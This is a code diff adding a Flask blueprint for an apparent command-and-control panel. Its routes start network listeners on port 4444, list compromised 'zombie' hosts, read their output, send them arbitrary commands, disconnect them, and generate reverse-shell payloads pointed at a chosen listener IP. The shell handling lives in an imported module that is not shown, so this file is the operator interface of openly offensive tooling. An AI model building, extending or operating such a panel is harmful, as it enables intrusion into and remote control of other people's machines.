@@ -1,0 +1,109 @@
+from flask import Blueprint, jsonify, request, session
+from handlers.c2_listener import (
+    start_listener, stop_listener, stop_all_listeners,
+    get_listeners, get_zombies, get_zombie_output,
+    send_command, disconnect_zombie, generate_payload
+)
+
+c2_bp = Blueprint('c2_routes', __name__)
+
+
+def login_required(f):
+    from functools import wraps
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not session.get('logged_in'):
+            from flask import redirect, url_for
+            return redirect(url_for('auth.login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+
+@c2_bp.route('/api/c2/listeners', methods=['GET'])
+@login_required
+def api_get_listeners():
+    return jsonify(get_listeners())
+
+
+@c2_bp.route('/api/c2/listener/start', methods=['POST'])
+@login_required
+def api_start_listener():
+    data = request.get_json()
+    port = data.get('port', 4444)
+    bind_addr = data.get('bind_addr', '0.0.0.0')
+    name = data.get('name', 'Default Listener')
+    result = start_listener(port, bind_addr, name)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/listener/stop', methods=['POST'])
+@login_required
+def api_stop_listener():
+    data = request.get_json()
+    listener_id = data.get('listener_id', '')
+    if not listener_id:
+        return jsonify({"status": "error", "message": "listener_id required."})
+    result = stop_listener(listener_id)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/listener/stop_all', methods=['POST'])
+@login_required
+def api_stop_all_listeners():
+    result = stop_all_listeners()
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/zombies', methods=['GET'])
+@login_required
+def api_get_zombies():
+    listener_id = request.args.get('listener_id', None)
+    result = get_zombies(listener_id)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/zombie/output', methods=['GET'])
+@login_required
+def api_get_zombie_output():
+    zombie_id = request.args.get('zombie_id', '')
+    since = int(request.args.get('since', 0))
+    if not zombie_id:
+        return jsonify({"status": "error", "message": "zombie_id required."})
+    result = get_zombie_output(zombie_id, since)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/zombie/command', methods=['POST'])
+@login_required
+def api_send_command():
+    data = request.get_json()
+    zombie_id = data.get('zombie_id', '')
+    command = data.get('command', '')
+    if not zombie_id or not command:
+        return jsonify({"status": "error", "message": "zombie_id and command required."})
+    result = send_command(zombie_id, command)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/zombie/disconnect', methods=['POST'])
+@login_required
+def api_disconnect_zombie():
+    data = request.get_json()
+    zombie_id = data.get('zombie_id', '')
+    if not zombie_id:
+        return jsonify({"status": "error", "message": "zombie_id required."})
+    result = disconnect_zombie(zombie_id)
+    return jsonify(result)
+
+
+@c2_bp.route('/api/c2/payload/generate', methods=['POST'])
+@login_required
+def api_generate_payload():
+    data = request.get_json()
+    listener_ip = data.get('listener_ip', '')
+    listener_port = data.get('listener_port', 4444)
+    payload_type = data.get('payload_type', 'python')
+    if not listener_ip:
+        return jsonify({"status": "error", "message": "listener_ip required."})
+    result = generate_payload(listener_ip, listener_port, payload_type)
+    return jsonify(result)
